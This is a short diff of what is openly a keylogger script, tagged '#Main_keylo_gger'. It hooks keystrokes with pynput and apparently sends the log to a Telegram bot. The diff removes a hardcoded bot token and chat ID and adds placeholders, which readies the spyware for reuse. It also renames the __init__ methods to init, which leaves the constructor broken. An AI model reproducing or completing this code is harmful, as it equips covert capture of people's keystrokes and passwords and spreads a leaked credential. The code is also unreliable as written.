@@ -8,7 +8,6 @@
 
 
 '''
-
 import os
 import requests
 from pynput.keyboard import Listener
@@ -29,7 +28,7 @@ class Install:
         from pynput import keyboard
         import threading
 
-def __init__():
+def init():
     Install
 
 class Send:
@@ -54,7 +53,7 @@ class Send:
 
 
 class Main:
-    def __init__(self, bot_token, chat_id):
+    def init(self, bot_token, chat_id):
         self.bot_token = bot_token
         self.chat_id = chat_id
         self.log = ""
@@ -86,7 +85,11 @@ class Main:
             l.join()
 
 
-bot_token = '7370505465:AAEUyvYvuWJh0o9Vo5sEf55-4FRZngtkXKM'
-chat_id = '7229230911'
+bot_token = '' #Paster You Bot TOken Here
+chat_id = '' #Paster You Chat ID Here
 main = Main(bot_token, chat_id)
 main.run()
+
+
+
+#Main_keylo_gger
